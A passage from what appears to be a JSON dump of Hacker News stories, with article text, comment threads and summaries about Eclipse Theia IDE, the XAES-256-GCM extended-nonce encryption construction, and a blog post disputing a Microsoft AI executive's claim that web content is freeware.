likelier to go the way of the original Eclipse IDE (whose homepage notably still doesn't say \"blazing fast\", \"rock solid\" and \"works out of the box\" but has room for a zillion other things like \"preferences page for Generic Text Editor\" and \"jar viewer\"). There's also a reason why almost every editor website starts with massive screenshots of the tool itself, because people want to be able to imagine what it would be like to use a new tool before taking the big step to actually try. This is marketing 101. I wish they'd just flat out copy a competitor's page, and bill themselves as \"everything you get from VSCode, but actually extensible and actually open source. By the way, look at the cool IDEs other people built on top of this, if you want to do that too, check out theia platform\". It could be great, but I'm just seeing so much self sabotage, it makes me sad. reply voidfunc 10 hours agoparentEclipse is kind of a monstrous organization and it's heavily rooted in European rather than Silicon Valley organizational theory. There's a lot of design by committee and other insanity so expecting a coherent marketing message is asking a lot. reply pessimizer 20 hours agoprevGet it into the Debian repos and I'll try it. If it's a good replacement for vscode, getting it into the major distros will get them a massive userbase in a month. Most people don't want to install MS garbage on their computer, and they are willing to take a mild quality hit in order to avoid it. Otherwise I'm not messing with something likely to disappear randomly. I value my workflow. reply philipwhiuk 21 hours agoprevIs Theia supposed to replace Eclipse IDE? What's the point here? reply tredre3 19 hours agoparentTheir goal seems to provide a framework for other projects to build custom IDEs. For example, Arduino based their 2.0 IDE on Theia. Whether or not it's truly a better base than upstream VS Code/Codium is hard to say. reply gtirloni 21 hours agoparentprev> What's the point here? Hard to say. reply TiredOfLife 20 hours agoparentprevMoney laundering. Nonprofits can't just take the money out. They have to do \"work\" reply omneity 19 hours agorootparentThis is a pretty wild claim on the Eclipse foundation. Do you have a source to substantiate it? reply TiredOfLife 19 hours agorootparentThe Theia editor. reply saagarjha 18 hours agorootparentThat doesn't back up your claim. reply zer0zzz 20 hours agoprevNope. Nope. Nope. There is literally no fond memory I’ve ever had of anything relating to eclipse. reply surfingdino 11 hours agoparentSame here. I will happily dance on the ashes of the last Eclipse repo. reply TiredOfLife 20 hours agoprevSo it's another reskined VS Code. reply adamnemecek 21 hours agoprevChallenge in terms of having a stupid name? If yes, then they are succeeding. reply hipadev23 20 hours agoprev [–] i still have nightmares of waiting for eclipse to load reply anta40 11 hours agoparent [–] What kind of setup? I remember fondly using Eclipse as main IDE during university days (2005-2006). Latex, C++, Java etc. On my 256 MB laptop, it was reasonably fast. Of course, many many years ago, I switched to IntelliJ (Android obviously is the main reason). reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The Eclipse Foundation's Theia IDE, after seven years of development, is now generally available, positioning itself as a \"true open-source alternative\" to Microsoft's Visual Studio Code (VS Code).",
      "Theia shares much of VS Code's technology, including the Monaco editor, Language Server Protocol (LSP), and Debug Adapter Protocol (DAP), and supports the same extensions via the Open VSX Registry.",
      "Theia emphasizes flexibility, privacy, and a vibrant open-source community, with contributions from major companies like Ericsson, IBM, and Google, and allows extensive customization without forking the code, suitable for both desktop and cloud IDEs."
    ],
    "commentSummary": [
      "Open source 'Eclipse Theia IDE' has exited beta, positioning itself as a competitor to Visual Studio Code (VS Code).",
      "Users highlight Theia's extensibility and web browser support, contrasting it with concerns over Microsoft's control and limited extensibility in VS Code.",
      "Theia aims to offer a customizable IDE framework, providing an open-source alternative with potential benefits over VS Code's more restrictive API."
    ],
    "points": 192,
    "commentCount": 136,
    "retryCount": 0,
    "time": 1719607763
  },
  {
    "id": 40826683,
    "title": "The XAES-256-GCM extended-nonce AEAD",
    "originLink": "https://words.filippo.io/dispatches/xaes-256-gcm/",
    "originBody": "26 Jun 2024 XAES-256-GCM About a year ago I wrote that “I want to use XAES-256-GCM/11, which has a number of nice properties and only the annoying defect of not existing.” Well, there is now an XAES-256-GCM specification. (Had to give up on the /11 part, but that was just a performance optimization.) XAES-256-GCM is an authenticated encryption with additional data (AEAD) algorithm with 256-bit keys and 192-bit nonces. It was designed with the following goals: supporting a nonce large enough to be safe to generate randomly for a virtually unlimited number of messages (2⁸⁰ messages with collision risk 2⁻³²); full, straightforward FIPS 140 compliance; and trivial implementation on top of common cryptographic libraries. The large nonce enables safer and more friendly APIs that automatically read a fresh nonce from the operating system’s CSPRNG for every message, without burdening the user with any birthday bound calculations. Compliance and compatibility make it available anywhere an AEAD might be needed, including in settings where alternative large-nonce AEADs are not an option. Like XChaCha20Poly1305, XAES-256-GCM is an extended-nonce construction on top of AES-256-GCM. That is, it uses the key and the large nonce to compute a derived key for the underlying AEAD. It’s simple enough to fit inline in this newsletter. Here we go. K and N are the input key and nonce, Kₓ and Nₓ are the derived AES-256-GCM key and nonce. L = AES-256ₖ(0x00, ..., 0x00) If MSB₁(L) = 0, then K1 = L << 1; Else K1 = (L << 1) ⊕ (0x00, ..., 0x00, 0b10000111) M1 = 0x00 || 0x01 || 0x58 || 0x00 || N[:12] M2 = 0x00 || 0x02 || 0x58 || 0x00 || N[:12] Kₓ = AES-256ₖ(M1 ⊕ K1) || AES-256ₖ(M2 ⊕ K1) Nₓ = N[12:] [Notation edited for clarity on 2024-06-29] As you can see, it costs three AES-256ₖ calls per message, although one can be precomputed for a given key, and the other two can reuse its key schedule. The Go reference implementation fits in less than 100 lines of mostly boilerplate, including the precomputation optimization, and only uses the standard library’s crypto/cipher and crypto/aes. Importantly, you could also describe XAES-256-GCM entirely in terms of a standard NIST SP 800-108r1 KDF and the standard NIST AES-256-GCM AEAD (NIST SP 800-38D, FIPS 197). Instantiate a counter-based KDF (NIST SP 800-108r1, Section 4.1) with CMAC-AES256 (NIST SP 800-38B) and the input key as Kin, the ASCII letter X (0x58) as Label, the first 96 bits of the input nonce as Context (as recommended by NIST SP 800-108r1, Section 4, point 4), a counter (i) size of 16 bits, and omitting the optional L field, and produce a 256-bit derived key. Use that derived key and the last 96 bits of the input nonce with AES-256-GCM. Thanks to the choice of parameters, if we peel off the KDF and CMAC abstractions, the result is barely slower and more complex than straightforwardly invoking AES-256 on a counter. In exchange, we get a vetted and compliant solution. The parameters are supported by the high-level OpenSSL API, too. Edit (2024-06-29): there are now third-party implementations for .NET 8+, pyca/cryptography, and the Web Cryptography API. The latter uses a 256-bit AES-CBC CryptoKey, which is pretty clever (complimentary). Why no more “/11”? Well, half the point of using AES-GCM is FIPS 140 compliance. (The other half being hardware acceleration.) If we mucked with the rounds number the design wouldn’t be compliant. Indeed, if compliance is not a goal there are a number of alternatives, from AES-GCM-SIV to modern AEAD constructions based on the AES core. The specification has an extensive Alternatives section that compares each of them to XAES-256-GCM. Also included in the specification are test vectors for the two main code paths (MSB₁(L) = 0 and 1), and accumulated test vectors that compress 10 000 or 1 000 000 random iterations. To sum up, XAES-256-GCM is designed to be a safe, boring, compliant, and interoperable AEAD that can fit high-level APIs, the kind we’d like to add to Go. It’s designed to complement XChaCha20Poly1305 and AES-GCM-SIV as implementations of a hypothetical nonce-less AEAD API. If other cryptography library maintainers like it (or don’t), I would love to hear about it, because we are not big fans of adding Go-specific constructions to the standard library. By the way, I have an exciting update about my professional open source maintainer effort coming in less than two weeks! Make sure to subscribe to Maintainer Dispatches or to follow me on Bluesky at @filippo.abyssdomain.expert or on Mastodon at @filippo@abyssdomain.expert. (Or, see you at GopherCon in Chicago!) Subscribe to Cryptography Dispatches for more! Subscribe The picture Earlier this year I ran in the Centopassi motorcycle competition. It involves driving more than 1600km on mountain roads, through one hundred GPS coordinates you select in advance from a long list, in three days and a half. It’s been fantastic. It took me to corners of Italy I would have never seen, and I had a lot of fun. This picture is taken at our 100th location, after a couple kilometers of unpaved hairpins on the side of the hill. The finish line was at the lake you can see in the distance. I was ecstatic. That’s my 2014 KTM Duke 690, a single-cylinder “naked” from before KTM knew how to make larger street bikes. It’s weird and I love it. My awesome clients—Sigsum, Latacora, Interchain, Smallstep, Ava Labs, Teleport, SandboxAQ, Charm, and Tailscale—are funding all my work for the community and through our retainer contracts they get face time and unlimited access to advice on Go and cryptography. Here are a few words from some of them! Latacora — Latacora bootstraps security practices for startups. Instead of wasting your time trying to hire a security person who is good at everything from Android security to AWS IAM strategies to SOC2 and apparently has the time to answer all your security questionnaires plus never gets sick or takes a day off, you hire us. We provide a crack team of professionals prepped with processes and power tools, coupling individual security capabilities with strategic program management and tactical project management. Teleport — For the past five years, attacks and compromises have been shifting from traditional malware and security breaches to identifying and compromising valid user accounts and credentials with social engineering, credential theft, or phishing. Teleport Identity Governance & Security is designed to eliminate weak access patterns through access monitoring, minimize attack surface with access requests, and purge unused permissions via mandatory access reviews. Ava Labs — We at Ava Labs, maintainer of AvalancheGo (the most widely used client for interacting with the Avalanche Network), believe the sustainable maintenance and development of open source cryptographic protocols is critical to the broad adoption of blockchain technology. We are proud to support this necessary and impactful work through our ongoing sponsorship of Filippo and his team. SandboxAQ — SandboxAQ’s AQtive Guard is a unified cryptographic management software platform that helps protect sensitive data and ensures compliance with authorities and customers. It provides a full range of capabilities to achieve cryptographic agility, acting as an essential cryptography inventory and data aggregation platform that applies current and future standardization organizations mandates. AQtive Guard automatically analyzes and reports on your cryptographic security posture and policy management, enabling your team to deploy and enforce new protocols, including quantum-resistant cryptography, without re-writing code or modifying your IT infrastructure.",
    "commentLink": "https://news.ycombinator.com/item?id=40826683",
    "commentBody": "The XAES-256-GCM extended-nonce AEAD (filippo.io)163 points by FiloSottile 19 hours agohidepastfavorite46 comments dchest 12 hours agoThe design is very clever: since it's based on CMAC, we can use AES-CBC to derive keys where lower level primitives are not available. In AES-CBC terms, the algorithm can be described as: 1. L = AES-CBC-256ₖ(iv = 0¹²⁸, plaintext = 0¹²⁸)[:16] 2. If MSB₁(L) = 0, then K1 = L`[0] * 16` (it's python oriented, maybe C has short idiom for that) or nice example with padded data: 0¹²⁰10000111 -> `[0] * 15 || 0b10000111`. `X` should be clearly 'X'. I guess crypto pros are ok with notation. But for hobbyist it requires some reverse engineering every time. reply FiloSottile 9 hours agorootparentI don't disagree, actually. I was copying the NIST source document notation with 0¹²⁸ and 0¹²⁰10000111, but it probably does more harm than good. `X` was just me being too clever. (In my defense, `X` is formatted differently from variables in the original, and all variables are defined.) Done. https://github.com/C2SP/C2SP/pull/86/files reply d-z-m 5 hours agoparentprev> 0¹²⁰10000111 for those of you(like me) wondering where this apparently spooky constant is coming from, it is a bitstring of the coefficients of the lexically first irreducible polynomial of degree b with the minimum possible number of non-zero terms, where b is the block size(in bits) of the underlying block cipher with which CMAC is instantiated. So, nothing up the sleeve here. reply Retr0id 3 hours agorootparentMy natural follow-up question was \"why can't you just have K1 = L?\" Obviously it's inherited from CMAC, but why does CMAC do it? Investigating further, general-case CMAC involves generating a K1 and a K2, which afaict just need to be arbitrarily different from each other. So why not something even simpler, like \"xor with 1\"? reply pbsd 24 minutes agorootparentThe multiplication in CMAC is there to distinguish between full and partial final input blocks. It can't be simply a xor with a constant because that would be easily cancelable in the input, and wouldn't satisfy the required xor-universal-like properties required by the security proof. The input here is highly restricted so there's no point to it. reply magicalhippo 4 hours agoparentprevNot a crypto guy. So would the high-level summary be something like this? Standard AES-GCM AEAD will catastrophically fail if you use the same nonce twice[1] for different messages, and the size of the size of the nonce is small enough that one cannot safely use a random nonce in many cases. This work provides an easy to use way to avoid that. It does so by changing not just the nonce but also the key used per message for the AES-GCM call. And it uses only \"plain\" AES which is readily available if you have AES-GCM, and no fancy new constructions which may have unknown weaknesses. The overhead per message is just two small buffers that needs to be encrypted/decrypted with \"plain\" AES and a longer 192 bit nonce. [1]: https://frereit.de/aes_gcm/ reply rzimmerman 16 hours agoprevIt seems like this removes the footgun in vanilla AES-GCM where you really need to rotate keys every ~2^32 messages if you are using a random nonce. Nonce collision in AES-GCM is catastrophic (it allows attackers to at least sign arbitrary messages). You don't need to use a random nonce, but it's usually recommended. Fairly clever to use two primitives (counter-based KDF and vanilla GCM) to make this FIPS compliant. reply kbolino 6 hours agoparentNo, this makes random nonces safe in the first place. With standard AES-GCM, you should use deterministic nonce generation since 96 bits is not enough to avoid random collisions. Also, you must change the nonce (or key) after 2^32 blocks regardless of how it was generated because the counter rolls over and the next block would use the same nonce+counter as the first block. reply chc4 4 hours agorootparentYou are wrong. NIST recommendations outline both deterministic or RBG-based construction. The 2^32 invocation limit is only for random nonce or if your deterministic construction is less than 96bits. Lots of people are doing random nonces. https://csrc.nist.gov/pubs/sp/800/38/d/final reply kbolino 3 hours agorootparentThat link says the document needs revising, specifically \"to clarify the guidance in connection with the IV constructions\" (NIST calls the nonce an IV). It defines GCM normatively but its non-normative recommendations are outdated. I also don't agree with the specific claim (made or at least implied by NIST) that a single 96-bit deterministic nonce isn't limited to 2³² blocks. The counter block will wrap around regardless of how the nonce was generated, because the GCTR function that is used to compute the ciphertext and authentication tag sets CBᵢ = inc32(CBᵢ₋₁) and CB₁ = ICB = inc₃₂(J₀) with J₀ a function of the nonce and inc₃₂ only incrementing the bottom 32 bits. Modern recommendations do not make this distinction around how the nonce was generated and I see no justification made for it by NIST. Perhaps it was meant to apply to the case where a portion of the nonce was implicit and thus not sent or stored in the clear, but deterministic generation doesn't always mean partially implicit nonces and the implicit part is too small (usually 32 bits) and too easy to obtain (often derived from a hardware identifier) to provide any additional security anyway. Using any nonce lengths other than 96 bits is not recommended today, regardless of the recommendations in 2007. Shorter lengths are obviously a poor choice, but longer lengths are not always supported by implementations. Moreover, while the published standard supports various lengths (with support for“compliant actually good encryption” an oxymoron, perhaps reply Retr0id 6 hours agoparentprev> they were fine with the X25519 public key part of age which I think was somewhat recently approved by NIST As far as I can tell, Ed25519 is approved (FIPS 186-5), but X25519 is still not (yet). reply candiddevmike 15 hours agoparentprevFWIW Go doesn't have an implementation of XAES in the stdlib yet, there's only the reference implementation in C2SP. reply 38 14 hours agorootparentThank goodness. I am kind of sick of the constant churn in the crypto package. I get that you want to keep up to date with security, but the entire crypto tree is basically a playground for Filippo Valsorda at this point. Meanwhile stuff that I actually need like CMAC is \"won't fix\" reply kbolino 5 hours agorootparentWhat churn does the crypto package get? It's part of the standard library and so bound by the compatibility promise, which basically freezes existing things in place. reply 38 5 hours agorootparentsee for yourself https://github.com/golang/go/commits/master/src/crypto reply kbolino 4 hours agorootparentChurn implies upheaval, breaking things that used to (and ought to) work. I don't see examples of that from the first few commits I examined. reply arccy 5 hours agorootparentprevso pretty stable, and you're mad that other people won't do free work for you to implement a mostly unused spec. reply sevg 2 hours agorootparentThere's a lot of this kind of entitlement around. Trash other peoples' work as \"playground\" activity, and demand they work on something else for free. reply tptacek 14 hours agorootparentprevWhat's another language with a stdlib that includes CMAC? reply rdpintqogeogsaa 12 hours agorootparentZig[1]. [1] https://ziglang.org/documentation/0.11.0/std/#A;std:crypto.a... reply ramchip 9 hours agorootparentprevErlang / Elixir reply tptacek 3 hours agorootparentLink? Does Elixir even have cryptography in the stdlib? reply 38 6 hours agorootparentprevGood logical fallacy reply omginternets 8 hours agoprevQuestion from a non-cryptographer: why use 192bit nonces instead of 256? I can’t imagine those extra bits would be considered costly in any practical application. reply FiloSottile 8 hours agoparentThere is no space for 256 bits: 192 bits is 96 bits from the underlying nonce space, and 96 bits that go into the 128-bit CMAC block (along with the necessary prefix). We could make the CMAC input longer, but then we'd have to run the AES-256 block function more times (and we'd hit some annoying key control issues in the CMAC KDF). This is actually similar to why XChaCha20Poly1305 has 192-bit nonces, and consistency with the other major extended-nonce AEAD is another mild advantage. reply upofadown 6 hours agoprev>(2⁸⁰ messages with collision risk 2⁻³²) Would there be an issue before that due to the fact that the AES block size is only 128 bits? reply FiloSottile 3 hours agoparentAssuming you’re referring to the birthday bound on blocks (https://sweet32.info) that’s a limit on blocks encrypted with a single key. XAES derives large keys per message, so it achieves what are commonly referred to as “better-than-birthday” bounds. reply Retr0id 4 hours agoparentprevNo (it's difficult to give a more detailed answer than that, without more detail on why you think it'd be an issue) reply owenpalmer 13 hours agoprevnext [3 more] [flagged] scintill76 13 hours agoparentSomebody make one of those tricky quizzes, \"is it a crypto algorithm or Elon Musk baby name?\" reply saagarjha 12 hours agoparentprevOnly natural to see him doing crypto grifting reply krisspy 16 hours agoprev [6 more] [flagged] tadfisher 15 hours agoparentThe British meaning is much newer, and is a bastardization of an extremely commonly-used word in the sciences (derived from a Latin root and all). Cringing at its use evokes the feeling I get when someone snickers at the pronunciation of \"Uranus\" in an astronomy course. reply kzrdude 11 hours agorootparentI guess this thread is talking about the word nonce, https://www.collinsdictionary.com/dictionary/english/nonce reply dmitrygr 16 hours agoparentprev [–] This is why people have the concept of context. reply tptacek 15 hours agorootparent [–] Don't feed egregious comments by replying; flag them instead. https://news.ycombinator.com/newsguidelines.html reply akira2501 15 hours agorootparent [–] I don't think the point was raised in bad faith nor do I find myself shocked by it's content. Flagging here seems extreme. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "XAES-256-GCM is a new AEAD (Authenticated Encryption with Associated Data) algorithm with 256-bit keys and 192-bit nonces, designed for safety, FIPS 140 compliance, and easy implementation.",
      "It is an extended-nonce construction on top of AES-256-GCM, requiring three AES-256 calls per message, with one precomputable, and is supported by common cryptographic libraries and the OpenSSL API.",
      "Third-party implementations are available for .NET 8+, pyca/cryptography, and the Web Cryptography API, with the Go reference implementation being under 100 lines using standard libraries."
    ],
    "commentSummary": [
      "The XAES-256-GCM extended-nonce AEAD (Authenticated Encryption with Associated Data) is a new cryptographic design that enhances nonce and key management for AES-GCM, addressing nonce reuse issues.",
      "This design uses AES-CBC (Cipher Block Chaining) to derive keys and employs a 192-bit nonce, improving security by preventing nonce collisions, which are catastrophic in standard AES-GCM.",
      "The implementation is currently available in the C2SP reference library, but not yet in the Go standard library, highlighting ongoing development and interest in the cryptographic community."
    ],
    "points": 163,
    "commentCount": 46,
    "retryCount": 0,
    "time": 1719619284
  },
  {
    "id": 40828441,
    "title": "All web \"content\" is freeware",
    "originLink": "https://rubenerd.com/all-web-content-is-freeware/",
    "originBody": "All web “content” is freeware Saturday 29 June 2024 Sean Endicott quoted a CNBC interview with Microsoft’s CEO of AI, and it’s nothing if not entertaining! “With respect to content that is already on the open web, the social contract of that content since the 90s has been that it is fair use. Anyone can copy it, recreate with it, reproduce with it. That has been freeware, if you like. That’s been the understanding,” said Suleyman. This is the same company behind this famous letter in 1976. Perhaps that’s why he bookended his claims with “since the 90s”. But that means torrents of Windows are freeware! Maybe he should have run this by legal first. Easy gotchas aside, this rambling, incoherent interview was a fascinating and deeply revealing perspective into how managers are thinking. It’s dawning on them that they’ve lost the financial argument, because these models are unsustainable to anyone not selling the shovels. Model decay has revealed the emperor has no clothes when it comes to tools “learning” or “being inspired” as artists are. The general public are beginning to equate “AI generated” with low effort and low quality, coining a new term in the process. There are also indications that peak AI may already soon be upon us, given they’re rapidly exhausting their supply of organic material to train against. Backed into an ethical, financial, mathematical, and legal corner, generative AI vendors are now resorting to arguing everything is fair game, because it always was. Don’t blame us, the Torment Nexus is established practice! This gives me the opportunity to address a point a lot of tech pundits are now making: a chatbot is no different from a search engine. The “social contract” here is that search engines could crawl our pages, create indexes, data mine them based on secret algorithms, and present processed results based on a query. A generative AI chatbox is no different, right? Except, and I know this may come as a shock: search engines link to their sources! Chatbots don’t. That’s what makes their “hallucinations” so dangerous; there’s no audit trail. Search engines deliver traffic, generative AI tools train against data to avoid doing that. The “social contract” here is completely upside down, as though a tool was asked to generate an image of it. This is the surest sign to me that we’re in a bubble again: the talking heads are beginning to believe their own nonsense. That’s another form of model decay, now that I think about it. Published: Saturday 29 June 2024 Tagged: ethics, generative-ai Written in: Sydney",
    "commentLink": "https://news.ycombinator.com/item?id=40828441",
    "commentBody": "All web \"content\" is freeware (rubenerd.com)151 points by imadj 11 hours agohidepastfavorite89 comments bdw5204 6 hours agoThis statement from Microsoft is just asking for a copyright infringement lawsuit because the courts have been very clear that web \"content\" is copyrighted unless it is explicitly placed in the public domain or old enough to no longer be under copyright. Authors of open source code should consider adding explicit restrictions to their license barring the use of their code to train AI. This would make it easier to file lawsuits against Microsoft and others of their ilk who think they can train their AI with other people's work without fair compensation. reply chrismorgan 4 hours agoparent> Authors of open source code should consider adding explicit restrictions to their license barring the use of their code to train AI. This would make it easier to file lawsuits against Microsoft and others of their ilk who think they can train their AI with other people's work without fair compensation. I see no reason to expect that this would alter or achieve anything. The wide-scale machine learning that’s been happening is entirely dependent on fair use exemptions from copyright. They’re not using it under your license—in fact can’t, current machine learning techniques and open source licenses already make it fundamentally impossible for them to comply—so what you put in it should be completely irrelevant. No, if the fair use exemption is ever struck down, the entire field is dead in the water until (a) a change in the legal system, or (b) services like GitHub start demanding an additional license as part of their terms of service for the purpose. reply dasil003 2 hours agorootparentNo one would let AI get shut down in the US, there’s just too much at stake. Even if we don’t like what’s going on, we’ll take a measured approach in regulating, because otherwise it will just go overseas. reply rchaud 19 minutes agoparentprevAny such lawsuit would be settled out of court, with no admission of guilt, and no damaging information coming out via introduction into public evidence. reply creativeSlumber 5 hours agoparentprevDoes GPL does this already? Doesn't it already say that code derived from GPL code should be GPLed? So does that include any code produced by an LLM based on GPL code ? reply bdw5204 3 hours agorootparentThat would seem to be a logical implication assuming courts reject claims that \"everything on the internet is public domain\" or that training an LLM on copyrighted material constitutes \"fair use\" of the copyrighted material. I suspect it would technically be infringement even for MIT licensed code because the original author's copyright notice would presumably be missing. reply charonn0 8 hours agoprev> Anyone can copy it, recreate with it, reproduce with it He seems to be confusing \"freeware\", which is basically a license for copyrighted work, with \"public domain\", which is the absence of a copyright. reply ChrisMarshallNY 7 hours agoparent> the absence of a copyright Ain't no such thing. Copyright exists, immediately upon creation (not publication) of a work. It's different from trademark, in that practical applications, enforcement, registration, etc., does not invalidate the copyright. Copyright can expire, which then becomes, effectively, \"public domain.\" Registering a copyright doesn't create the copyright. It simply makes it easier to go after those that disrespect it. I'm pretty sure that the only way to truly transfer the ownership of copyright of a work, is to have agreements in place, before it is created (like \"work for hire\" contracts). reply latexr 7 hours agorootparentAs a creator you can also explicitly dedicate a piece of work to the public domain, thus relinquishing any copy right to it. That’s what licenses like CC0, WTFPL, and The Unlicense do. However, even being in the public domain does not in itself mean you can do everything. For example, in France you still have to respect the “moral rights” of the author, meaning you have to include their name and original title. https://en.wikipedia.org/wiki/Copyright_law_of_France#The_pu... reply kevincox 5 hours agorootparentprevThere is such thing. There are three main ways for work to be public domain. - Expiry of copyright. - Explicit dedicated to the public domain by the copyright holder. - Non-copyrightable work (such as computer or animal generated work). reply ChrisMarshallNY 5 hours agorootparentIn the case of the first two, the copyright actually exists, but is unenforceable. In the last one, copyright doesn’t exist, because it can’t, so the point is moot. > animal generated work Actually, didn’t that monkey get copyright of the image? I can’t remember, for sure. We can’t actually transfer the copyright, itself; only the rights to adapt and/or reproduce. reply throwaway211 7 hours agorootparentprevOntologically, copyright doesn't exist. Copyright is an epistemology. If copyright could exist, then a copyright for the copyright must be able to exist, and it'd be turtles all the way down. This is not nitpicking. Copyright, as intellectual property, is entirely made up as all other intellectual property is. Saying copyright exists is as laughable as saying intellectual property is as non rivalrous as the chair you sit in. reply rileymat2 6 hours agorootparentI am not sure what you are getting at, all property rights are made up agreements, as is what is defined as property, what can be privatized and what rights that affords you. Take tangible land, your exclusive use of it has boundaries, for example airspace rights or mineral rights. It is all made up. The difference is tangible v intangible, but in either case the rights are made up. reply namds 6 hours agorootparentprevWhat is it with this new ontological wave on the Interwebs? For a mathematical axiom, do you need another axiom that tells us that the first one exists? And so forth? How would you prove the existence of the universe? Do we not need a bigger universe that contains ours? And so forth? (Don't mention the big bang, which is a bunch of non-falsifiable formulas.) reply inopinatus 6 hours agorootparentprevnarrator: the courts were not kind to the sophomore philosophy student whose defence was the non-existence of laws reply lucianbr 6 hours agorootparentprevMan, this is some weapons-grade hair-splitting. I tip my hat to you, sir. Still. People have gone to jail for copyright infringement, so I doubt at least they would feel like laughing at the idea that copyright exists. reply outofpaper 6 hours agorootparentWho has gotten jail or prison time for copyright violations in recent times? I’m aware of recent cases in Canada where defendants chose to ignore a court ruling and attempt to republish very similar material as what the court had originally found them to be in copyright violation for. They were then found to be in contempt of the court which is a criminal offence and then ordered to complete jail time and pay substantial fines. Copyright violations are not criminal offences in countries I’m aware of. Please tell me of any cases where a copyright violator faced jail time for the copyright violation and not for related criminal offences. reply fragmede 6 hours agorootparent> Swedish prosecutors filed charges on 31 January 2008 against Fredrik Neij, Gottfrid Svartholm, and Peter Sunde, who ran the site; and Carl Lundström, a Swedish businessman who through his businesses sold services to the site. The prosecutor claimed the four worked together to administer, host, and develop the site and thereby facilitated other people's breach of copyright law. https://en.wikipedia.org/wiki/The_Pirate_Bay_trial Swedish law has only gotten more strict since 2008 with regard to copyright. reply tomcam 6 hours agorootparentprevGood to see Terrance Howard is back after his brief hiatus reply coldtea 5 hours agorootparentprev>Ontologically, copyright doesn't exist. Copyright is an epistemology. You keep using these words, ontology and epistemology. I don't think they mean what you think they mean. >If copyright could exist, then a copyright for the copyright must be able to exist, and it'd be turtles all the way down This doesn't make any sense. First, not all things that exist are covered by copyright or have a copyright about them existing (air exists, but doesn't have a copyright. Neither do slugs, pebbles, Uranus, and other existing things). Copyright is just sets of laws dictating ability to copy, distribute, and so on. It doesn't need a copyright for itself, and even if it did, the regular terms for reproducing any other legal code would suffice. >Copyright, as intellectual property, is entirely made up as all other intellectual property is. All human laws and conventions are made up. Doesn't mean anything - copyright is still enforceable with very real prison buildings, cells, and bars - and if resisting arrest for it, very tangible police battons, tasers, and bullets are not out of question either. reply greyman 7 hours agoparentprevHe said \"fair use\", and only then added, quite unnecessary \"or freeware, if you want\". He primarily meant fair use. reply croes 9 hours agoprevI bet if any other company did it instead of MS they would sue the hell out of them for using their data. reply enumjorge 5 hours agoparentI bet if Microsoft were not extracting value from someone else's content, but instead had their content being used to power someone else's business, they'd be singing a very different tune. reply wang_li 5 hours agorootparentThis already happened and MS sent a cease and desist. https://en.wikipedia.org/wiki/HiQ_Labs_v._LinkedIn reply boesboes 7 hours agoprevWithout trying to take a stance on this, I do have to say I like the FastGPT feature that comes with Kagi. It basically does a search and uses those results to answer questions. Now I'd just want it to have a better UI with history and some sort of notebook mode instead of chat. I'm not sure how, but I don't want to chat with AI, I want a different way to 'instruct' it. reply bdcravens 8 hours agoprev> Perhaps that’s why he bookended his claims with “since the 90s” No, it's because the web has existed since 1991. (Though for the puritans, the paper was written in 1989 and the first browser was developed in 1990) https://www.npr.org/2021/08/06/1025554426/a-look-back-at-the... reply Sophira 7 hours agoprevHas everyone forgotten the furore that was Cook's Source Magazine stealing a recipe that was published online? https://yro.slashdot.org/story/10/11/04/1940257/cooks-magazi... reply wooptoo 7 hours agoprev> search engines link to their sources! Chatbots don’t. Actually Copilot does provide links to its sources, which adds credibility and promotes further exploration. reply ralferoo 9 hours agoprevMore discussion on similar article: https://news.ycombinator.com/item?id=40828438 reply kkfx 8 hours agoprevI agree, so please Microsoft shut you mouth if I grab your maps, wrap your services and so on, because they are web-based so I am free to do whatever I like with them, relevant licenses does not count. reply rchaud 18 minutes agoparentMicrosoft wouldn't care unless you started a competing maps product. reply kkfx 3 minutes agorootparentWhy not, if they want my data to train their LLMs why not doing the inverse with their, for business as they do on their own side. If for them all public stuff is free for commercial use... reply fundad 5 hours agoprevHow did they train auto-completers or classifiers if they didn’t train on the open web? How did Pandora train if not on copyrighted music? reply rchaud 17 minutes agoparentPandora can train on anything, but they can only stream music that they have paid to license. Microsoft isn't paying anything to anybody. reply tjpnz 7 hours agoprevI intend to use Mustafa Suleyman's likeness and name for my next project. It's part comic book/part novel and tells the story of a socially awkward tech CEO getting way out of his comfort zone by moonlighting as a male porn star. It ends with an OJ Simpson style police chase when it's discovered that Mustafa has been embezzling funds to support a drug habit and addiction to plastic surgery. reply Almondsetat 7 hours agoprevCopilot links to its sources. The author should reconsider having this blatantly false and easily verifiable article up on their website reply aflag 5 hours agoparentI think saying it links its sources is a bit of a stretch. It links related articles which may or may not be the source for what it just said (also, may or may not be related :P) reply Zambyte 4 hours agorootparentWhat tools are you thinking of? I think saying it links its sources is absolutely not a stretch. My experience is with Kagi and with Perplexity; both of which it has even returned messages saying something along the lines of the source documents not being able to answer the question. reply aflag 36 minutes agorootparentCopilot doesn't link to the sources. It doesn't really know what their sources are. It links to article that may be related to what it just said. Many times the sources even contradict what was said. So definitely not a source in that case reply pseudalopex 1 hour agorootparentprevThey were thinking of the tool the 1st comment named probably. reply scotty79 8 hours agoprev> But that means torrents of Windows are freeware! For many, many years now, if you need Windows you can just download it from Microsoft and run simple, non-intrusive activation procedure (not from Microsoft) after installation. No cracks needed. As much security as hip high front porch gate. So even for MS the understanding was that these things are de facto freeware for anyone that wants them at all. reply jsheard 7 hours agoparentFeel free to start a business selling computers with pirated copies of Windows and Office pre-installed, or build out a corporate network or cloud service with them, and find out first-hand how much Microsoft really considers their products to be \"de-facto freeware\". reply scotty79 7 hours agorootparentWhy would I be selling stuff I got for free? It's unethical. Installing software on a computer is not \"transformative\". Training AI is very much. reply rchaud 2 hours agorootparentOpenAI/Microsoft are building a business around stuff they got for free. That is the whole point of the above comment. reply jorams 6 hours agoparentprev> run simple, non-intrusive activation procedure (not from Microsoft) > No cracks needed. These are contradictory statements, and I'm not sure why you'd think otherwise. reply lucianbr 7 hours agoparentprevConveniently ignoring that you may be sued into oblivion if you have enough money to make it worth it for them. Come on. Windows is only free for people not making significant amounts of money with it. If you do make money... surprise: https://www.bsa.org/ reply scotty79 7 hours agorootparentWhy would I care about rich people problems that try to get ahead without paying others they use to get ahead? Laws are never the same for the rich and the poor. And if they are to differ then it's the better direction for them to differ. reply lucianbr 6 hours agorootparentYour assertion that Microsoft allows everyone to use Windows for free is false. What you care or not care about is irrelevant in this context. I have no clue why you brought it up. Now if you wish to assert that Microsoft allows peons to use Windows for free, as long as it is convenient for them, I can agree with that. They're still a bunch of hypocrites. Allowing Microsoft to selectively apply the law as it benefits them is not a good thing, you're confused. reply scotty79 6 hours agorootparentIf you do not allow people to do something and yet hundreds of millions of 